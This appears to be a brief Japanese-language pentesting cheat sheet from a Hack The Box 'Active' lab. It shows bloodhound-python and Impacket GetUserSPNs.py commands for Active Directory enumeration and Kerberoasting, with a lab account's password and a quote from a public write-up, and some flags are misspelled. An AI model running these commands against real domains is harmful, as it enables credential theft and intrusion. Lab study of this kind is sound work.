## Blood Hound from "LOCAL"

```
┌──(kali㉿kali)-[~]
└─$ bloodhound-python -u <domain account> -p <account's password> -ns <target's IP> -d <Domain> -c Al

(e.g.) $ loodhound-python -u svc_tgs -p GPPstillStandingStrong2k18 -ns 10.10.10.100 -d active.htb -c Al
```

## GetUserSPNs.py
指定したドメインアカウント下で動いてるSPN（Service Principal Name）を探す。

- -reqeust: TGS（サービスチケットを発行するサーバ）にリクエストを出す
- -save: TGSを保存する（<username>.ccacheのフォーマット）

```
┌──(kali㉿kali)-[~]
└─$ GetUserSPNs.py -request -dc-ip <target's IP> <domain>/<user name> -save -outputfile GetUserSPNs.out

(e.g.) $ GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```


c.f.[0xdf hacks stuff](https://0xdf.gitlab.io/2018/12/08/htb-active.html#decrypting-gpp-password)

> I’ll use the GetUserSPNs.py script from Impacket to get a list of service usernames which are associated with normal user accounts. 
It will also get a ticket that I can crack. 


